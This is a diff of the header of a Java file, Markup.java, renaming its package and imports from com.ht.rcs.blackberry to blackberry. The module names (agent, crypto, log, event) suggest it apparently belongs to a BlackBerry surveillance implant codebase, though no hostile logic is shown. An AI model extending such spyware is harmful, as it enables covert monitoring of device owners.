@@ -5,22 +5,22 @@
  * File         : Markup.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.log;
+package blackberry.log;
 
 import java.io.IOException;
 
 import net.rim.device.api.util.NumberUtilities;
 
-import com.ht.rcs.blackberry.agent.Agent;
-import com.ht.rcs.blackberry.config.Keys;
-import com.ht.rcs.blackberry.crypto.Encryption;
-import com.ht.rcs.blackberry.event.Event;
-import com.ht.rcs.blackberry.fs.AutoFlashFile;
-import com.ht.rcs.blackberry.fs.Path;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.agent.Agent;
+import blackberry.config.Keys;
+import blackberry.crypto.Encryption;
+import blackberry.event.Event;
+import blackberry.fs.AutoFlashFile;
+import blackberry.fs.Path;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 public class Markup {
 
